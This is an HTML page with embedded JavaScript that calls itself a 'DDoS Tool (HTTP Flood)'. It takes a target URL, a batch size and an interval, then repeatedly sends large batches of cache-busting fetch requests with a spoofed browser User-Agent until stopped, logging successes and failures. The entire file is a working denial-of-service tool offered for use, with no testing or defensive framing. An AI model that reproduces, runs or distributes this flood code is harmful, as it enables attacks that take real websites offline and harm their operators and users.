<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>DDoS Tool</title>
    <style>
        body { background: #0a0a0a; color: #0f0; font-family: monospace; padding: 20px; }
        input, button { background: #1a1a1a; color: #0f0; border: 1px solid #0f0; padding: 8px; margin: 5px; }
        button { cursor: pointer; }
        .log { border: 1px solid #0f0; height: 300px; overflow-y: scroll; padding: 10px; margin-top: 20px; }
    </style>
</head>
<body>
<h2>DDOS TOOL (HTTP FLOOD)</h2>
<label>Target URL: <input type="text" id="target" placeholder="http://example.com" size="50"></label><br>
<label>Threads (requests per batch): <input type="number" id="threads" value="50" min="1" max="500"></label><br>
<label>Interval (ms): <input type="number" id="interval" value="100" min="10" max="5000"></label><br>
<button id="startBtn">START ATTACK</button>
<button id="stopBtn" disabled>STOP</button>
<div class="log" id="log"></div>

<script>
    let attackActive = false;
    let attackInterval = null;

    function log(msg) {
        const logDiv = document.getElementById('log');
        const entry = document.createElement('div');
        entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
        logDiv.appendChild(entry);
        logDiv.scrollTop = logDiv.scrollHeight;
    }

    function sendRequest(url) {
        return new Promise((resolve) => {
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), 3000);
            fetch(url, {
                method: 'GET',
                mode: 'no-cors',
                cache: 'no-store',
                signal: controller.signal,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Pragma': 'no-cache',
                    'Cache-Control': 'no-cache'
                }
            }).then(() => {
                clearTimeout(timeout);
                resolve(true);
            }).catch(() => {
                clearTimeout(timeout);
                resolve(false);
            });
        });
    }

    async function flood(target, threads) {
        const promises = [];
        for (let i = 0; i < threads; i++) {
            promises.push(sendRequest(target));
        }
        const results = await Promise.all(promises);
        const success = results.filter(r => r === true).length;
        log(`Sent ${threads} requests, successful: ${success}, failed: ${threads - success}`);
    }

    async function startAttack() {
        const target = document.getElementById('target').value.trim();
        const threads = parseInt(document.getElementById('threads').value);
        const interval = parseInt(document.getElementById('interval').value);

        if (!target) {
            log('ERROR: Target URL is empty');
            return;
        }

        if (!target.startsWith('http://') && !target.startsWith('https://')) {
            log('ERROR: URL must start with http:// or https://');
            return;
        }

        attackActive = true;
        document.getElementById('startBtn').disabled = true;
        document.getElementById('stopBtn').disabled = false;

        log(`ATTACK STARTED on ${target} | threads per batch: ${threads} | interval: ${interval}ms`);

        attackInterval = setInterval(async () => {
            if (!attackActive) return;
            await flood(target, threads);
        }, interval);
    }

    function stopAttack() {
        attackActive = false;
        if (attackInterval) {
            clearInterval(attackInterval);
            attackInterval = null;
        }
        document.getElementById('startBtn').disabled = false;
        document.getElementById('stopBtn').disabled = true;
        log('ATTACK STOPPED');
    }

    document.getElementById('startBtn').addEventListener('click', startAttack);
    document.getElementById('stopBtn').addEventListener('click', stopAttack);
</script>
</body>
</html>
